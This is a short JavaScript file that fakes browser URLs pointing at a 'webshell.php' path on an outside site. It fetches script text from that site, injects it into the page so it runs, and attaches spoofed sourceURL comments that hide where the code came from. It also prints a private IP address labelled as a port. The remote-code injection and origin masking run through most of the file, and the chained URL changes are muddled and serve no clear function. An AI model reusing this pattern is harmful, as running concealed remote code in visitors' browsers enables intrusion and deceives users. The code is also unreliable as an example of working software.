function addportJSToURL() {
    history.pushState(null, null, "/prijava/port.js");
  }
  
  function removeportJSFromURL() {
    history.pushState(null, null, "/prijava");
  }
  
  function changeURLToWebshell() {
    history.pushState(null, null, "/prijava/port.js?=/webshell.php:3000");
  }
  
  function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  addportJSToURL();
  
  fetch('https://www.hgspot.hr/prijava/port.js')
    .then(response => response.text())
    .then(data => {
      const script = document.createElement('script');
      script.textContent = data;
  
      document.head.appendChild(script);
  
      console.log("Script in /port.js has finished running.");
  
      removeportJSFromURL();
  
      wait(200)
        .then(() => {
          history.pushState(null, null, "/prijava/port.js?");
  
          wait(200)
            .then(() => {
              history.pushState(null, null, "/prijava/port.js");
  
              wait(200)
                .then(() => {
                  changeURLToWebshell();
  
                  wait(200)
                    .then(() => {
                      history.pushState(null, null, "/prijava");
  
                      fetch('https://www.hgspot.hr/prijava/port.js')
                        .then(response => response.text())
                        .then(data => {
                          const script = document.createElement('script');
                          script.textContent = data + '\n//# sourceURL=' + 'https://www.hgspot.hr/prijava/port.js?p=/webshell.php';
  
                          document.head.appendChild(script);
  
                          console.log("Script in /webshell.php has finished running.");
  
                          editWebshellJSContent();
                        })
                        .catch(error => {
                          console.error('Error fetching "/prijava/?p=/webshell.php":', error);
                        });
                    });
                });
            });
        });
    })
    .catch(error => {
      console.error('Error fetching "/prijava/port.js":', error);
    });
  
  function editWebshellJSContent() {
    const script = document.createElement('script');
    script.textContent = 'console.log("PORT 192.168.8.107");';
    document.head.appendChild(script);
  }
  
  fetch('https://www.hgspot.hr/prijava/port?p=/webshell.php')
    .then(response => response.text())
    .then(data => {
      const script = document.createElement('script');
      script.textContent = data + '\n//# sourceURL=' + 'https://www.hgspot.hr/prijava';
      document.head.appendChild(script);
    })
